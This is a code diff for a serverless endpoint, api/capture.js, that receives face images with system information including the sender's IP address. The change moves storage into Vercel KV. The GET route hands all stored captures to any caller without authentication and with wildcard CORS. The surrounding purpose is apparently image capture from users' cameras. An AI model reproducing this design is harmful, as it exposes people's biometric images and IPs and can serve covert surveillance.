@@ -1,9 +1,8 @@
 // api/capture.js
-let capturedFaces = global.capturedFaces || [];
-global.capturedFaces = capturedFaces;
+import { kv } from '@vercel/kv';
 
-export default function handler(req, res) {
-    console.log('Capture API called:', req.method, req.url, 'Body:', req.body);
+export default async function handler(req, res) { // async functionに変更
+    console.log('Capture API called:', req.method, req.url);
     
     // CORS headers
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -19,7 +18,7 @@ export default function handler(req, res) {
         try {
             const { images, system_info, timestamp } = req.body;
             
-            // 新しいキャプチャデータを追加
+            // 新しいキャプチャデータを準備
             const captureData = {
                 id: Date.now(),
                 timestamp: timestamp || new Date().toISOString(),
@@ -28,14 +27,11 @@ export default function handler(req, res) {
                 capture_count: images ? images.length : 0
             };
             
-            capturedFaces.push(captureData);
-            global.capturedFaces = capturedFaces;
+            // Vercel KVにデータを保存 (リストの先頭に追加)
+            await kv.lpush('captured_faces', JSON.stringify(captureData));
             
-            // 最新の50件のみ保持
-            if (capturedFaces.length > 50) {
-                capturedFaces = capturedFaces.slice(-50);
-                global.capturedFaces = capturedFaces;
-            }
+            // リストが50件を超えたら、古いものから削除して50件に保つ
+            await kv.ltrim('captured_faces', 0, 49);
             
             console.log(`新しい顔画像を受信: ${captureData.capture_count}枚, IP: ${system_info?.ip_address || 'Unknown'}`);
             
@@ -91,8 +87,9 @@ export default function handler(req, res) {
             });
         }
     } else if (req.method === 'GET') {
-        // データを取得
-        res.status(200).json(capturedFaces);
+        // Vercel KVからデータを取得
+        const data = await kv.lrange('captured_faces', 0, -1);
+        res.status(200).json(data.map(item => JSON.parse(item)));
     } else {
         res.status(405).json({ error: 'Method not allowed' });
     }
